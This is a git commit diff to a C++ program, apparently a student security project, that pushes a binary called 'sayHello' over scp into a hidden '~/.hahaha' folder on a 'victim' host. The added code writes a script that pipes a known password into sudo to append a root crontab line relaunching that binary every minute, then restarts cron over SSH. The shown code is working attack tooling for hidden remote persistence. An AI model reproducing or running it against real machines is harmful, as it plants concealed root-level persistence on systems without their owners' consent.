7e40f986fcc2610b783fa6396428dc0b8ceb520c
marmot0814 <s1357andy871207@gmail.com>
2019-04-19 17:54:54 +0800

    auto trigger

--- project2/main.cpp
+++ project2/main.cpp
@@ -2,10 +2,11 @@
 using namespace std;
 void cmd(string s) {
     int ret = system(s.c_str());
+    cout << '\n';
     if (ret)
-        cout << "\x1b[31mError\x1b[0m : ";
+        cout << "\x1b[31mRE\x1b[0m : ";
     else
-        cout << "\x1b[32mAccept\x1b[0m: ";
+        cout << "\x1b[32mAC\x1b[0m: ";
     cout << s << '\n';
 }
 void cmd_on_victim(string ssh_prefix, string s) {
@@ -39,4 +40,14 @@ int main(int argc, char **argv) {
     cmd("scp sayHello " + username + "@" + ip_addr + ":~/.hahaha/sayHello");
     
     // set crontab
+    string crontab = "* * * * * root pgrep sayHello > /dev/null || cd /home/" + username + "/.hahaha && ./sayHello";
+    ofstream *add_crontab = new ofstream("add_crontab.sh");
+    *add_crontab << "#! /bin/bash\n\n";
+    *add_crontab << "echo \"" + password + "\" | sudo -S sh -c \'echo \"" + crontab + "\" >> /etc/crontab\'";
+    delete add_crontab;
+
+    cmd("scp add_crontab.sh " + username + "@" + ip_addr + ":~/.hahaha/add_crontab.sh");
+    cmd("rm add_crontab.sh");
+    cmd_on_victim(ssh_prefix, "cd /home/" + username + "/.hahaha && chmod +x add_crontab.sh && ./add_crontab.sh");
+    cmd_on_victim(ssh_prefix, "echo \"" + password + "\" | sudo -S /etc/init.d/cron restart");
 }
